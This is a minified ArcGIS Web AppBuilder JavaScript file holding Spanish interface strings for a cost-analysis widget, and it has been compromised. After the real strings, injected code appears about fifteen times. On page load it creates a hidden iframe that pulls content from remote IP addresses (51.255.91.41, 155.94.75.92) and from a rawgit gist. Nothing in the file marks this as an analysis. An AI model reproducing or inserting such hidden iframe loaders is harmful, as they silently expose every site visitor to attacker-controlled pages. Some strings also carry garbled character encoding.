// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Definir texto de configuraci\u00f3n:",generalSettings:{tabTitle:"Configuraci\u00f3n general",measurementUnitLabel:"Unidad de medici\u00f3n",currencyLabel:"S\u00edmbolo de medici\u00f3n",roundCostLabel:"Redondear coste",projectOutputSettings:"Configuraci\u00f3n de salida del proyecto",typeOfProjectAreaLabel:"Tipo de \u00e1rea del proyecto",bufferDistanceLabel:"Distancia de zona de influencia",roundCostValues:{twoDecimalPoint:"Dos puntos decimales",
nearestWholeNumber:"N\u00famero entero m\u00e1s cercano",nearestTen:"Decena m\u00e1s cercana",nearestHundred:"Centena m\u00e1s cercana",nearestThousand:"Unidad de millar m\u00e1s cercana",nearestTenThousands:"Decena de millar m\u00e1s cercana"},projectAreaType:{outline:"Lista",buffer:"Zona de influencia"},errorMessages:{currency:"Divisa no v\u00e1lida",bufferDistance:"Distancia de zona de influencia no v\u00e1lida",outOfRangebufferDistance:"El valor debe ser mayor que 0 y menor o igual que 100"}},
projectSettings:{tabTitle:"Configuraci\u00f3n del proyecto",costingGeometrySectionTitle:"Definir geograf\u00eda para el c\u00e1lculo de costes (opcional)",costingGeometrySectionNote:"Nota: Al configurar esta capa, el usuario podr\u00e1 establecer ecuaciones de costes para plantillas de entidades basadas en geograf\u00edas.",projectTableSectionTitle:"Posibilidad de Guardar/Cargar configuraci\u00f3n del proyecto (opcional)",projectTableSectionNote:"Nota: Al configurar todas las tablas y capas, el usuario podr\u00e1 guardar/cargar el proyecto para un uso posterior.",
costingGeometryLayerLabel:"Capa de geometr\u00eda para c\u00e1lculo de costes",fieldLabelGeography:"Campo a etiquetar geograf\u00eda",projectAssetsTableLabel:"Tabla de activos del proyecto",projectMultiplierTableLabel:"Tabla de costes adicionales multiplicadora del proyecto",projectLayerLabel:"Capa del proyecto",configureFieldsLabel:"Configurar campos",fieldDescriptionHeaderTitle:"Descripci\u00f3n de campo",layerFieldsHeaderTitle:"Campo de capa",selectLabel:"Seleccionar",errorMessages:{duplicateLayerSelection:"${layerName} ya se ha seleccionado",
invalidConfiguration:"Seleccione ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eSe mostrar\u00e1n las capas poligonales que re\u00fanan las siguientes condiciones: \x3cbr/\x3e \x3cli\x3e\tLa capa debe tener la capacidad \u00e2\u20ac\u0153Consulta\u00e2\u20ac\u009d\x3c/li\x3e\x3cli\x3e\tLa capa deber tener un campo GlobalID\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3eLa cadena y los campos num\u00e9ricos de la \u00e2\u20ac\u0153Capa de geometr\u00eda para c\u00e1lculo de costes\u00e2\u20ac\u009d seleccionada aparecer\u00e1n en la lista desplegable \u00e2\u20ac\u0153Campo a etiquetar geograf\u00eda\u00e2\u20ac\u009d.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eSe mostrar\u00e1n las tablas que re\u00fanan las siguientes condiciones: \x3cbr/\x3e \x3cli\x3eLa tabla debe tener capacidades de edici\u00f3n, es decir, \u00e2\u20ac\u0153Crear\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Eliminar\u00e2\u20ac\u009d y \u00e2\u20ac\u0153Actualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLa tabla debe contener seis campos con nombre y tipo de datos exactos:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (campo tipo GUID)\x3c/li\x3e\x3cli\x3e\tCostEquation (campo tipo cadena)\x3c/li\x3e\x3cli\x3e\tScenario (campo tipo cadena)\x3c/li\x3e\x3cli\x3e\tTemplateName (campo tipo cadena)\x3c/li\x3e\x3cli\x3e    GeographyGUID (campo tipo GUID)\x3c/li\x3e\x3cli\x3e\tProjectGUID (campo tipo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eSe mostrar\u00e1n las tablas que re\u00fanan las siguientes condiciones: \x3cbr/\x3e \x3cli\x3eLa tabla debe tener capacidades de edici\u00f3n, es decir, \u00e2\u20ac\u0153Crear\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Eliminar\u00e2\u20ac\u009d y \u00e2\u20ac\u0153Actualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLa tabla debe contener cinco campos con nombre y tipo de datos exactos:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (campo tipo cadena)\x3c/li\x3e\x3cli\x3e\tType (campo tipo cadena)\x3c/li\x3e\x3cli\x3e\tValue (campo tipo Flotante/Doble)\x3c/li\x3e\x3cli\x3e\tCostindex (campo tipo Entero)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (campo tipo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eSe mostrar\u00e1n las capas poligonales que re\u00fanan las siguientes condiciones: \x3cbr/\x3e \x3cli\x3eLa tabla debe tener capacidades de edici\u00f3n, es decir, \u00e2\u20ac\u0153Crear\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Eliminar\u00e2\u20ac\u009d y \u00e2\u20ac\u0153Actualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eLa capa debe contener cinco campos con nombre y tipo de datos exactos:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (campo tipo cadena)\x3c/li\x3e\x3cli\x3eDescription (campo tipo cadena)\x3c/li\x3e\x3cli\x3eTotalassetcost (campo tipo Flotante/Doble)\x3c/li\x3e\x3cli\x3eGrossprojectcost (campo tipo Flotante/Doble)\x3c/li\x3e\x3cli\x3eGlobalID (campo tipo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Configuraci\u00f3n de capa",layerNameHeaderTitle:"Nombre de capa",layerNameHeaderTooltip:"Lista de capas del mapa",EditableLayerHeaderTitle:"Editable",EditableLayerHeaderTooltip:"Incluir la capa y sus plantillas en el widget de c\u00e1lculo de costes",SelectableLayerHeaderTitle:"Seleccionable",SelectableLayerHeaderTooltip:"La geometr\u00eda de la entidad se puede utilizar para generar un nuevo elemento de coste",fieldPickerHeaderTitle:"Id. del proyecto (opcional)",fieldPickerHeaderTooltip:"Campo opcional (de tipo cadena) para almacenar el Id. del proyecto en",
selectLabel:"Seleccionar",noAssetLayersAvailable:"No se ha encontrado ninguna capa de activos en el mapa web seleccionado",disableEditableCheckboxTooltip:"Esta capa no tiene capacidades de edici\u00f3n"},costingInfo:{tabTitle:"Informaci\u00f3n de c\u00e1lculo de costes",proposedMainsLabel:"Red propuesta",addCostingTemplateLabel:"Agregar plantilla de c\u00e1lculo de costes",manageScenariosTitle:"Administrar escenarios",featureTemplateTitle:"Plantilla de entidad",costEquationTitle:"Ecuaci\u00f3n de costes",
geographyTitle:"Geograf\u00eda",scenarioTitle:"Escenario",actionTitle:"Acciones",scenarioNameLabel:"Nombre de escenario",addBtnLabel:"Agregar",srNoLabel:"N.\u00ba",deleteLabel:"Eliminar",duplicateScenarioName:"Duplicar nombre de escenario",hintText:"\x3cdiv\x3eSugerencia: Utilice las siguientes palabras clave\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Usa el n\u00famero total de activos del mismo tipo dentro de una geograf\u00eda\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Usa la longitud para activos lineales y el \u00e1rea para activos poligonales\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Usa la longitud total para los activos lineales y el \u00e1rea total para los activos poligonales del mismo tipo dentro de una geograf\u00eda\x3c/li\x3e\x3c/ul\x3ePuede usar funciones tales como:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eEdite la ecuaci\u00f3n de costes seg\u00fan las necesidades de su proyecto.",
noneValue:"Ninguna",requiredCostEquation:"Ecuaci\u00f3n de costes no v\u00e1lida para ${layerName} : ${templateName}",duplicateTemplateMessage:"La entrada de plantilla duplicada ya existe para ${layerName} : ${templateName}",defaultEquationRequired:"Se requiere la ecuaci\u00f3n predeterminada para ${layerName} : ${templateName}",validCostEquationMessage:"Introduzca una ecuaci\u00f3n de costes v\u00e1lida",costEquationHelpText:"Edite la ecuaci\u00f3n de costes seg\u00fan las necesidades de su proyecto",
scenarioHelpText:"Seleccione el escenario seg\u00fan las necesidades de su proyecto",copyRowTitle:"Copiar fila",noTemplateAvailable:"Agregue al menos una plantilla para ${layerName}",manageScenarioLabel:"Administrar escenario",noLayerMessage:"Introduzca al menos una capa en ${tabName}",noEditableLayersAvailable:"Es necesario marcar la capa como editable en la pesta\u00f1a de configuraci\u00f3n de la capa"},statisticsSettings:{tabTitle:"Configuraci\u00f3n de estad\u00edsticas",addStatisticsLabel:"Agregar estad\u00edsticas",
fieldNameTitle:"Campo",statisticsTitle:"Etiqueta",addNewStatisticsText:"Agregar estad\u00edsticas nuevas",deleteStatisticsText:"Eliminar estad\u00edsticas",moveStatisticsUpText:"Subir estad\u00edsticas",moveStatisticsDownText:"Bajar estad\u00edsticas",selectDeselectAllTitle:"Seleccionar todo"},statisticsType:{countLabel:"Recuento",averageLabel:"Media",maxLabel:"M\u00e1ximo",minLabel:"M\u00ednimo",summationLabel:"Suma",areaLabel:"\u00c1rea",lengthLabel:"Longitud"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});